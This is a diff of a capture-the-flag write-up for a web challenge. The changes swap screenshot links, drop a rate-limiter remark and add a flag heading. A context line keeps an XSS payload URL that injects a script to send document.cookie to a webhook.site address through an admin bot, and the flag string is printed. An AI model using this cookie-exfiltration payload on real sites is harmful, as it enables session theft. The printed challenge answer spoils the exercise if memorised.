@@ -11,7 +11,7 @@ On launching the challenge we land at a homepage which has fields for username,p
 
 <hr>
 
-![image](https://github.com/user-attachments/assets/e9ccee82-277f-4621-beb2-3e3a7940838d)
+![image](https://github.com/user-attachments/assets/a791a61a-ad4d-433d-9935-7d9f56f89914)
 
 On reading the source provided we get to know that only user with name 'admin' can login with his supersecure password which obviously we can not know as it is a environment variable.
 
@@ -71,10 +71,10 @@ Lets give this link to our admin bot :) and get the flag
 ```bash
 http://localhost:3000/posts/657c83681afbebe2ea01432d/?%22%3E%3C/script%3E%3Cscript%3Efetch(`https://webhook.site/566eb0b9-796b-48d6-bcd5-fbb9584eee71?${document.cookie}`)%3C/script%3E
 ```
-![image](https://github.com/user-attachments/assets/e100a892-bff9-4802-929c-4eb44205e201)
+![image](https://github.com/user-attachments/assets/01d28bdd-9471-4d93-9756-37535bc366fc)
 
-9. A ratelimiter was configured to block you from making more than 100 requests in 60 minutes (enough to annoy you :)
 
+## Flag
 ```bash
 flag{pR0707yP3_p0150n1n9_AND_v173j5_5ay_n01c3_99}
 ```
